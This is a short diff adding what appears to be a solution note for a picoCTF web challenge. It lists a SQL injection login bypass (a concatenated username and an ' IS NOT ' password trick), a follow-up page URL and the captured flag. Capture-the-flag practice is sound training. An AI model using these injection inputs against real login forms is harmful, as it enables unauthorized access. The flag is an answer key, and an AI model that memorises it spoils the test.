@@ -1,0 +1,8 @@
+Access to http://wily-courier.picoctf.net:56973/:
+
+Username: ad'||'min
+Password: ' IS NOT '
+
+Access to: http://wily-courier.picoctf.net:56973/filter.php
+
+picoCTF{k3ep_1t_sh0rt_d0339730}
